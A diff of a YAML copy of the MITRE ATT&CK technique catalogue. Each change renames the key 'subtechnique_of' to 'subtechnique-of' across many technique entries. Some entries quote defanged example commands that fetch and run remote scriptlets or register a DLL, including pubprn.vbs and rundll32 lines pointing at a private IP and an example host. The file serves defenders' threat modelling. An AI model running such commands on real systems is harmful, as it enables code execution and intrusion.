 - id: T1590.003
@@ -7349,7 +7674,7 @@
     establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
     or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or
     initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).'
-  subtechnique_of: T1590
+  subtechnique-of: T1590
   tactics:
   - TA0043
 - id: T1095
@@ -7379,7 +7704,7 @@
     encoding schemes may be based on or related to standard data encoding schemes,
     such as a modified Base64 encoding for the message body of an HTTP request.(Citation:
     Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) '
-  subtechnique_of: T1132
+  subtechnique-of: T1132
   tactics:
   - TA0011
 - id: T1571
@@ -7437,7 +7762,7 @@
     sluggish and/or unresponsive, due to the work it must do to eliminate the rogue
     ACK packets. This greatly reduces the resources available for providing the targeted
     service.(Citation: Corero SYN-ACKflood)'
-  subtechnique_of: T1499
+  subtechnique-of: T1499
   tactics:
   - TA0040
 - id: T1027
@@ -7504,7 +7829,7 @@
     \ (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"\
     &rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo\
     \ Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) \n"
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1137
@@ -7553,7 +7878,7 @@
     \ place it in a trusted location.(Citation: GlobalDotName Jun 2019) \n\nAn adversary\
     \ may need to enable macros to execute unrestricted depending on the system or\
     \ enterprise security policy on use of macros."
-  subtechnique_of: T1137
+  subtechnique-of: T1137
   tactics:
   - TA0003
 - id: T1137.002
@@ -7579,7 +7904,7 @@
 
     Adversaries may add this Registry key and specify a malicious DLL that will be
     executed whenever an Office application, such as Word or Excel, is started.'
-  subtechnique_of: T1137
+  subtechnique-of: T1137
   tactics:
   - TA0003
 - id: T1102.003
@@ -7601,7 +7926,7 @@
     those offered by Google or Twitter, makes it easier for adversaries to hide in
     expected noise. Web service providers commonly use SSL/TLS encryption, giving
     adversaries an added level of protection.'
-  subtechnique_of: T1102
+  subtechnique-of: T1102
   tactics:
   - TA0011
 - id: T1137.003
@@ -7616,7 +7941,7 @@
     \ loaded when Outlook is started. Malicious forms will execute when an adversary\
     \ sends a specifically crafted email to the user.(Citation: SensePost Outlook\
     \ Forms)"
-  subtechnique_of: T1137
+  subtechnique-of: T1137
   tactics:
   - TA0003
 - id: T1137.004
@@ -7631,7 +7956,7 @@
     \ have been added to the user\u2019s mailbox, they will be loaded when Outlook\
     \ is started. Malicious Home Pages will execute when the right Outlook folder\
     \ is loaded/reloaded.(Citation: SensePost Outlook Home Page)\n"
-  subtechnique_of: T1137
+  subtechnique-of: T1137
   tactics:
   - TA0003
 - id: T1137.005
@@ -7647,7 +7972,7 @@
     s mailbox, they will be loaded when Outlook is started. Malicious rules will execute\
     \ when an adversary sends a specifically crafted email to the user.(Citation:\
     \ SilentBreak Outlook Rules)"
-  subtechnique_of: T1137
+  subtechnique-of: T1137
   tactics:
   - TA0003
 - id: T1134.004
@@ -7682,7 +8007,7 @@
     as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new
     process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov
     2017)'
-  subtechnique_of: T1134
+  subtechnique-of: T1134
   tactics:
   - TA0005
   - TA0004
@@ -7700,7 +8025,7 @@
     \ PtH may be used to perform actions on local or remote systems.\n\nWindows 7\
     \ and higher with KB2871997 require valid domain user credentials or RID 500 administrator\
     \ hashes.(Citation: NSA Spotting)"
-  subtechnique_of: T1550
+  subtechnique-of: T1550
   tactics:
   - TA0005
   - TA0008
@@ -7726,7 +8051,7 @@
     \ can be obtained for the domain using the Key Distribution Service account KRBTGT\
     \ account NTLM hash, which enables generation of TGTs for any account in Active\
     \ Directory.(Citation: Campbell 2014)"
-  subtechnique_of: T1550
+  subtechnique-of: T1550
   tactics:
   - TA0005
   - TA0008
@@ -7744,7 +8069,7 @@
     Wikipedia Password cracking) The resulting plaintext password resulting from a
     successfully cracked hash may be used to log into systems, resources, and services
     in which the account has access.'
-  subtechnique_of: T1110
+  subtechnique-of: T1110
   tactics:
   - TA0006
 - id: T1556.002
@@ -7765,7 +8090,7 @@
     \ the LSA. A malicious password filter would receive these plain-text credentials\
     \ every time a password request is made.(Citation: Carnal Ownage Password Filters\
     \ Sept 2013)"
-  subtechnique_of: T1556
+  subtechnique-of: T1556
   tactics:
   - TA0006
   - TA0005
@@ -7824,7 +8149,7 @@
 
     In default environments, LDAP and Kerberos connection attempts are less likely
     to trigger events over SMB, which creates Windows "logon failure" event ID 4625.'
-  subtechnique_of: T1110
+  subtechnique-of: T1110
   tactics:
   - TA0006
 - id: T1201
@@ -7896,7 +8221,7 @@
 
     In default environments, LDAP and Kerberos connection attempts are less likely
     to trigger events over SMB, which creates Windows "logon failure" event ID 4625.'
-  subtechnique_of: T1110
+  subtechnique-of: T1110
   tactics:
   - TA0006
 - id: T1601.001
@@ -7951,7 +8276,7 @@
     \ on the stored copy, this technique will not survive across reboots.  However,\
     \ live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)\
     \ to achieve persistence. "
-  subtechnique_of: T1601
+  subtechnique-of: T1601
   tactics:
   - TA0005
 - id: T1034
@@ -8066,7 +8391,7 @@
     is in the PATH environment variable, a program that is named net.exe and placed
     in <code>C:\example path</code> will be called instead of the Windows system "net"
     when "net" is executed from the command-line.'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -8104,7 +8429,7 @@
 
     Search order hijacking is also a common practice for hijacking DLL loads and is
     covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -8134,7 +8459,7 @@
     This technique can be used for persistence if executables are called on a regular
     basis, as well as privilege escalation if intercepted executables are started
     by a higher privileged process.'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -8232,7 +8557,7 @@
     \ Malware). The API method <code> SMLoginItemSetEnabled</code> can be used to\
     \ set Login Items, but scripting languages like [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
     \ can do this as well. (Citation: Adding Login Items)"
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -8257,7 +8582,7 @@
     Adversaries may infect PAM resources with code to harvest user credentials, since
     the values exchanged with PAM components may be plain-text since PAM does not
     store passwords.(Citation: PAM Creds)(Citation: Apple PAM)'
-  subtechnique_of: T1556
+  subtechnique-of: T1556
   tactics:
   - TA0006
   - TA0005
@@ -8281,7 +8606,7 @@
     Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets
     in question. Another method leverages raw sockets, which enables the malware to
     use ports that are already open for use by other programs.'
-  subtechnique_of: T1205
+  subtechnique-of: T1205
   tactics:
   - TA0005
   - TA0003
@@ -8301,7 +8626,7 @@
     \ following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\
     \nAdversaries can use this technique to load malicious code at startup that will\
     \ persist on system reboot and execute as SYSTEM."
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -8322,7 +8647,7 @@
     \ to the process's memory, system/network resources, and possibly elevated privileges.\
     \ Execution via PE injection may also evade detection from security products since\
     \ the execution is masked under a legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -8355,7 +8680,7 @@
     framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick
     Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp
     APR 2014)'
-  subtechnique_of: T1059
+  subtechnique-of: T1059
   tactics:
   - TA0002
 - id: T1546.013
@@ -8379,7 +8704,7 @@
     \ \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell\
     \ profile is loaded and executed by an account with higher privileges, such as\
     \ a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)"
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -8421,7 +8746,7 @@
     \ restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print\
     \ spooler service runs under SYSTEM level permissions, therefore print processors\
     \ installed by an adversary may run under elevated privileges."
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -8443,7 +8768,7 @@
     \ for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056)\
     \ for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110)\
     \ the passphrase off-line."
-  subtechnique_of: T1552
+  subtechnique-of: T1552
   tactics:
   - TA0006
 - id: T1003.007
@@ -8463,7 +8788,7 @@
     memory, then harvests passwords and hashes by looking for text strings and regex
     patterns for how given applications such as Gnome Keyring, sshd, and Apache use
     memory to store such authentication artifacts.'
-  subtechnique_of: T1003
+  subtechnique-of: T1003
   tactics:
   - TA0006
 - id: T1055.009
@@ -8492,7 +8817,7 @@
     \ and possibly elevated privileges. Execution via proc memory injection may also\
     \ evade detection from security products since the execution is masked under a\
     \ legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -8552,7 +8877,7 @@
     \ the security context) of the injecting process. However, execution via process\
     \ doppelg\xE4nging may evade detection from security products since the execution\
     \ is masked under a legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -8577,7 +8902,7 @@
     \ spawned from (and thus inherits the security context) of the injecting process.\
     \ However, execution via process hollowing may also evade detection from security\
     \ products since the execution is masked under a legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -8609,7 +8934,7 @@
     \ impersonate a fake SSL/TLS handshake to make it look like subsequent traffic\
     \ is SSL/TLS encrypted, potentially interfering with some security tooling, or\
     \ to make the traffic look like it is related with a trusted entity. "
-  subtechnique_of: T1001
+  subtechnique-of: T1001
   tactics:
   - TA0011
 - id: T1572
@@ -8679,7 +9004,7 @@
     \ resources, and possibly elevated privileges. Execution via ptrace system call\
     \ injection may also evade detection from security products since the execution\
     \ is masked under a legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -8696,7 +9021,7 @@
     proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example
     command is <code>cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs
     127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>.'
-  subtechnique_of: T1216
+  subtechnique-of: T1216
   tactics:
   - TA0005
 - id: T1597.002
@@ -8719,7 +9044,7 @@
     \ or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or\
     \ initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)\
     \ or [Valid Accounts](https://attack.mitre.org/techniques/T1078))."
-  subtechnique_of: T1597
+  subtechnique-of: T1597
   tactics:
   - TA0043
 - id: T1059.006
@@ -8737,7 +9062,7 @@
     such as file operations and device I/O. Adversaries can use these libraries to
     download and execute commands or other scripts as well as perform various malicious
     behaviors.'
-  subtechnique_of: T1059
+  subtechnique-of: T1059
   tactics:
   - TA0002
 - id: T1012
@@ -8777,7 +9102,7 @@
     \ Escalation by stealing a Domain Admin or higher privileged account session.\
     \ All of this can be done by using native Windows commands, but it has also been\
     \ added as a feature in red teaming tools.(Citation: Kali Redsnarf)"
-  subtechnique_of: T1563
+  subtechnique-of: T1563
   tactics:
   - TA0008
 - id: T1542.004
@@ -8797,7 +9122,7 @@
     TFTP) with adversary code and restart the device in order to overwrite the existing
     ROMMON image. This provides adversaries with the means to update the ROMMON to
     gain persistence on a system in a way that may be difficult to detect.'
-  subtechnique_of: T1542
+  subtechnique-of: T1542
   tactics:
   - TA0005
   - TA0003
@@ -8818,7 +9143,7 @@
     Adversaries can use the rc.common file as a way to hide code for persistence that
     will execute on each reboot as the root user. (Citation: Methods of Mac Malware
     Persistence)'
-  subtechnique_of: T1037
+  subtechnique-of: T1037
   tactics:
   - TA0003
   - TA0004
@@ -8835,7 +9160,7 @@
     \ \n\nAn adversary can modify one of these files directly to include a link to\
     \ their malicious executable to provide a persistence mechanism each time the\
     \ user reboots their machine (Citation: Methods of Mac Malware Persistence)."
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -8859,7 +9184,7 @@
     introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601)
     to change the configuration of the device. (Citation: Cisco Blog Legacy Device
     Attacks)'
-  subtechnique_of: T1600
+  subtechnique-of: T1600
   tactics:
   - TA0005
 - id: T1108
@@ -8911,7 +9236,7 @@
     particular, the memcache protocol showed itself to be a powerful protocol, with
     amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare
     Memcrashed Feb 2018)'
-  subtechnique_of: T1498
+  subtechnique-of: T1498
   tactics:
   - TA0040
 - id: T1547.001
@@ -9014,7 +9339,7 @@
     remote access tools, to maintain persistence through system reboots. Adversaries
     may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make
     the Registry entries look as if they are associated with legitimate programs.'
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -9034,7 +9359,7 @@
     The code with the registration and unregistration attributes will be executed
     even if the process is run under insufficient privileges and fails to execute.
     (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)'
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1218.010
@@ -9064,7 +9389,7 @@
     Regsvr32.exe can also be leveraged to register a COM Object used to establish
     persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015).
     (Citation: Carbon Black Squiblydoo Apr 2016)'
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1219
@@ -9110,7 +9435,7 @@
 
     By staging data on one system prior to Exfiltration, adversaries can minimize
     the number of connections made to their C2 server and better evade detection.'
-  subtechnique_of: T1074
+  subtechnique-of: T1074
   tactics:
   - TA0009
 - id: T1021.001
@@ -9128,7 +9453,7 @@
     \ will likely use Credential Access techniques to acquire credentials to use with\
     \ RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008)\
     \ technique for Persistence.(Citation: Alperovitch Malware)"
-  subtechnique_of: T1021
+  subtechnique-of: T1021
   tactics:
   - TA0008
 - id: T1114.002
@@ -9140,7 +9465,7 @@
     Adversaries may also access externally facing Exchange services or Office 365
     to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413)
     can be used to automate searches for specific keywords.
-  subtechnique_of: T1114
+  subtechnique-of: T1114
   tactics:
   - TA0009
 - id: T1563
@@ -9206,7 +9531,7 @@
     utility is copied or moved to a different directory and renamed to avoid detections
     based on system utilities executing from non-standard paths. (Citation: F-Secure
     CozyDuke)'
-  subtechnique_of: T1036
+  subtechnique-of: T1036
   tactics:
   - TA0005
 - id: T1091
@@ -9254,7 +9579,7 @@
     persistent, local, and/or ephemeral, with the ephemeral types often reset upon
     stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation:
     Google - Restore Cloud Snapshot)'
-  subtechnique_of: T1578
+  subtechnique-of: T1578
   tactics:
   - TA0005
 - id: T1036.002
@@ -9277,7 +9602,7 @@
     RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe
     displays the reversed characters but the command line tool reg.exe does not by
     default.'
-  subtechnique_of: T1036
+  subtechnique-of: T1036
   tactics:
   - TA0005
 - id: T1207
@@ -9342,7 +9667,7 @@
     running a virtual instance, adversaries may create a shared folder between the
     guest and host with permissions that enable the virtual instance to interact with
     the host file system.(Citation: Sophos Ragnar May 2020)'
-  subtechnique_of: T1564
+  subtechnique-of: T1564
   tactics:
   - TA0005
 - id: T1218.011
@@ -9366,7 +9691,7 @@
     ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This
     behavior has been seen used by malware such as Poweliks. (Citation: This is Security
     Command Line Confusion)'
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1565.003
@@ -9387,7 +9712,7 @@
     access to specialized software related to the system that would typically be gained
     through a prolonged information gathering campaign in order to have the desired
     impact.'
-  subtechnique_of: T1565
+  subtechnique-of: T1565
   tactics:
   - TA0040
 - id: T1134.005
@@ -9409,7 +9734,7 @@
     to otherwise inaccessible domains via lateral movement techniques such as [Remote
     Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077),
     or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).'
-  subtechnique_of: T1134
+  subtechnique-of: T1134
   tactics:
   - TA0005
   - TA0004
@@ -9475,7 +9800,7 @@
     \ since these malicious components may be invoked by any application that performs\
     \ code signing or signature validation. (Citation: SpectorOps Subverting Trust\
     \ Sept 2017)"
-  subtechnique_of: T1553
+  subtechnique-of: T1553
   tactics:
   - TA0005
 - id: T1021.002
@@ -9505,7 +9830,7 @@
     Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also
     use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)
     and certain configuration and patch levels.(Citation: Microsoft Admin Shares)'
-  subtechnique_of: T1021
+  subtechnique-of: T1021
   tactics:
   - TA0008
 - id: T1602.001
@@ -9530,7 +9855,7 @@
     devices in order to collect network information that allows the adversary to build
     network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation:
     Cisco Blog Legacy Device Attacks) '
-  subtechnique_of: T1602
+  subtechnique-of: T1602
   tactics:
   - TA0009
 - id: T1505.001
@@ -9553,7 +9878,7 @@
     \ CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are\
     \ linked to stored procedures since these CLR assemblies can be made to execute\
     \ arbitrary commands.(Citation: NetSPI SQL Server CLR) "
-  subtechnique_of: T1505
+  subtechnique-of: T1505
   tactics:
   - TA0003
 - id: T1021.004
@@ -9569,7 +9894,7 @@
     \ authentication scenario, the user\u2019s public key must be in a special file\
     \ on the computer running the server that lists which keypairs are allowed to\
     \ login as that user.(Citation: SSH Secure Shell)"
-  subtechnique_of: T1021
+  subtechnique-of: T1021
   tactics:
   - TA0008
 - id: T1098.004
@@ -9590,7 +9915,7 @@
     \ add their own adversary-supplied public keys. This ensures that an adversary\
     \ possessing the corresponding private key may log in as an existing user via\
     \ SSH.(Citation: Venafi SSH Key Abuse) (Citation: Cybereason Linux Exim Worm)"
-  subtechnique_of: T1098
+  subtechnique-of: T1098
   tactics:
   - TA0003
 - id: T1563.001
@@ -9616,7 +9941,7 @@
     [SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use
     of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an
     existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).'
-  subtechnique_of: T1563
+  subtechnique-of: T1563
   tactics:
   - TA0008
 - id: T1596.005
@@ -9640,7 +9965,7 @@
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
     or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).'
-  subtechnique_of: T1596
+  subtechnique-of: T1596
   tactics:
   - TA0043
 - id: T1595.001
@@ -9662,7 +9987,7 @@
     operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).'
-  subtechnique_of: T1595
+  subtechnique-of: T1595
   tactics:
   - TA0043
 - id: T1053.005
@@ -9687,7 +10012,7 @@
     or on a scheduled basis for persistence. The Windows Task Scheduler can also be
     abused to conduct remote Execution as part of Lateral Movement and or to run a
     process under the context of a specified account (such as SYSTEM).'
-  subtechnique_of: T1053
+  subtechnique-of: T1053
   tactics:
   - TA0002
   - TA0003
@@ -9769,7 +10094,7 @@
     Adversaries can use screensaver settings to maintain persistence by setting the
     screensaver to run malware after a certain timeframe of user inactivity. (Citation:
     ESET Gazer Aug 2017)'
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -9849,7 +10174,7 @@
     operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
     or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial
     access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).'
-  subtechnique_of: T1593
+  subtechnique-of: T1593
   tactics:
   - TA0043
 - id: T1596
@@ -9933,7 +10258,7 @@
     \ be used to process the SAM database locally to retrieve hashes.(Citation: GitHub\
     \ Creddump7)\n\nNotes: \n* RID 500 account is the local, built-in administrator.\n\
     * RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n"
-  subtechnique_of: T1003
+  subtechnique-of: T1003
   tactics:
   - TA0006
 - id: T1518.001
@@ -9958,7 +10283,7 @@
 
     Adversaries may also utilize cloud APIs to discover the configurations of firewall
     rules within an environment.(Citation: Expel IO Evil in AWS)'
-  subtechnique_of: T1518
+  subtechnique-of: T1518
   tactics:
   - TA0007
 - id: T1547.005
@@ -9976,7 +10301,7 @@
     Packages</code>. An adversary may modify these Registry keys to add new SSPs,
     which will be loaded the next time the system boots, or when the AddSecurityPackage
     Windows API function is called.(Citation: Graeber 2014)'
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -9997,7 +10322,7 @@
     \ of keys and algorithms to encrypt the user\u2019s password, but once the master\
     \ key is found, an attacker need only iterate over the other values to unlock\
     \ the final password.(Citation: OS X Keychain)"
-  subtechnique_of: T1555
+  subtechnique-of: T1555
   tactics:
   - TA0006
 - id: T1583.004
@@ -10014,7 +10339,7 @@
     \ take place using online infrastructure. Or, they may need to build extensive\
     \ infrastructure if they want to test, communicate, and control other aspects\
     \ of their activities on their own systems.(Citation: NYTStuxnet)"
-  subtechnique_of: T1583
+  subtechnique-of: T1583
   tactics:
   - TA0042
 - id: T1584.004
@@ -10031,7 +10356,7 @@
 
     Adversaries may also compromise web servers to support watering hole operations,
     as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).'
-  subtechnique_of: T1584
+  subtechnique-of: T1584
   tactics:
   - TA0042
 - id: T1505
@@ -10063,7 +10388,7 @@
     be done by either executing a new or modified service. This technique is the execution
     used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003)
     during service persistence or privilege escalation.'
-  subtechnique_of: T1569
+  subtechnique-of: T1569
   tactics:
   - TA0002
 - id: T1499.002
@@ -10093,7 +10418,7 @@
     the cryptographic renegotiation has a meaningful cost in computation cycles, this
     can cause an impact to the availability of the service when done in volume.(Citation:
     Arbor SSLDoS April 2012)'
-  subtechnique_of: T1499
+  subtechnique-of: T1499
   tactics:
   - TA0040
 - id: T1489
@@ -10134,7 +10459,7 @@
     ones as a means of executing code at a higher permissions level. If the executing
     process is set to run at a specific time or during a certain event (e.g., system
     bootup) then this technique can also be used for persistence.'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -10167,7 +10492,7 @@
     (such as <code>FailureCommand</code>) that may be executed in an elevated context
     anytime the service fails or is intentionally corrupted.(Citation: Kansa Service
     related collectors)(Citation: Tweet Registry Perms Weakness) '
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -10191,7 +10516,7 @@
     \ <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.\n\
     \nAdversaries can use this mechanism on their own malware to make sure they're\
     \ able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware)."
-  subtechnique_of: T1548
+  subtechnique-of: T1548
   tactics:
   - TA0004
   - TA0005
@@ -10266,7 +10591,7 @@
     * Links to network shares and other internal resources
 
     '
-  subtechnique_of: T1213
+  subtechnique-of: T1213
   tactics:
   - TA0009
 - id: T1547.009
@@ -10283,7 +10608,7 @@
     to look like a legitimate program. Adversaries could also edit the target path
     or entirely replace an existing shortcut so their tools will be executed instead
     of the intended legitimate program.'
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -10327,7 +10652,7 @@
 
     Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
     or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).'
-  subtechnique_of: T1558
+  subtechnique-of: T1558
   tactics:
   - TA0006
 - id: T1593.001
@@ -10348,7 +10673,7 @@
     \ establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
     \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or\
     \ initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003))."
-  subtechnique_of: T1593
+  subtechnique-of: T1593
   tactics:
   - TA0043
 - id: T1585.001
@@ -10370,7 +10695,7 @@
     \ may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation:\
     \ BlackHatRobinSage) These accounts may be leveraged during other phases of the\
     \ adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003))."
-  subtechnique_of: T1585
+  subtechnique-of: T1585
   tactics:
   - TA0042
 - id: T1586.001
@@ -10398,7 +10723,7 @@
     \ through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised\
     \ profiles may be leveraged during other phases of the adversary lifecycle, such\
     \ as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003))."
-  subtechnique_of: T1586
+  subtechnique-of: T1586
   tactics:
   - TA0042
 - id: T1592.002
@@ -10425,7 +10750,7 @@
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for
     initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)
     or [External Remote Services](https://attack.mitre.org/techniques/T1133)).'
-  subtechnique_of: T1592
+  subtechnique-of: T1592
   tactics:
   - TA0043
 - id: T1072
@@ -10482,7 +10807,7 @@
     \ of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries\
     \ may create their own packing techniques that do not leave the same artifacts\
     \ as well-known packers to evade defenses.  "
-  subtechnique_of: T1027
+  subtechnique-of: T1027
   tactics:
   - TA0005
 - id: T1153
@@ -10526,7 +10851,7 @@
 
     Adversaries can use this feature to trick users into double clicking benign-looking
     files of any format and ultimately executing something malicious.'
-  subtechnique_of: T1036
+  subtechnique-of: T1036
   tactics:
   - TA0005
 - id: T1566.001
@@ -10553,7 +10878,7 @@
     extensions and icons in order to make attached executables appear to be document
     files, or files exploiting one application appear to be a file for a different
     one.'
-  subtechnique_of: T1566
+  subtechnique-of: T1566
   tactics:
   - TA0001
 - id: T1598.002
@@ -10579,7 +10904,7 @@
     efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
     or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594))
     to craft persuasive and believable lures.'
-  subtechnique_of: T1598
+  subtechnique-of: T1598
   tactics:
   - TA0043
 - id: T1566.002
@@ -10605,7 +10930,7 @@
     \ Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order\
     \ to gain access to protected applications and information.(Citation: Trend Micro\
     \ Pawn Storm OAuth 2017)"
-  subtechnique_of: T1566
+  subtechnique-of: T1566
   tactics:
   - TA0001
 - id: T1598.003
@@ -10632,7 +10957,7 @@
     efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
     or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594))
     to craft persuasive and believable lures.'
-  subtechnique_of: T1598
+  subtechnique-of: T1598
   tactics:
   - TA0043
 - id: T1598.001
@@ -10661,7 +10986,7 @@
     efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or
     [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to
     craft persuasive and believable lures.'
-  subtechnique_of: T1598
+  subtechnique-of: T1598
   tactics:
   - TA0043
 - id: T1566.003
@@ -10688,7 +11013,7 @@
     \ likely to open the file since it's something they were expecting. If the payload\
     \ doesn't work as expected, the adversary can continue normal communications and\
     \ troubleshoot with the target on how to get it working."
-  subtechnique_of: T1566
+  subtechnique-of: T1566
   tactics:
   - TA0001
 - id: T1132.001
@@ -10701,7 +11026,7 @@
     include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text
     Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems
     may also result in data compression, such as gzip.'
-  subtechnique_of: T1132
+  subtechnique-of: T1132
   tactics:
   - TA0011
 - id: T1037.005
@@ -10721,7 +11046,7 @@
     \ StartupItems directory to register their own persistence mechanism (Citation:\
     \ Methods of Mac Malware Persistence). Additionally, since StartupItems run during\
     \ the bootup phase of macOS, they will run as the elevated root user."
-  subtechnique_of: T1037
+  subtechnique-of: T1037
   tactics:
   - TA0003
   - TA0004
@@ -10819,7 +11144,7 @@
     \ another obfuscated script to gather intelligence from the victim's machine and\
     \ communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets\
     \ Pyeongchang Olympics)  "
-  subtechnique_of: T1027
+  subtechnique-of: T1027
   tactics:
